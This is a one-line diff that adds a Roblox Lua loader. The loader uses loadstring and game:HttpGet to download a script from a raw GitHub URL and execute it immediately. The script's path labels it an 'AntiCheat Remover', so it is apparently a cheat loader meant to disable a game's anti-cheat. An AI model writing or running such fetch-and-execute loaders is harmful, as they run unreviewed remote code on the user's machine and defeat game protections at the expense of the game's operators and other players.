@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/pozm/MyScripts/master/Lpi%20AntiCheat%20Remover/MainFile.lua'),true))()
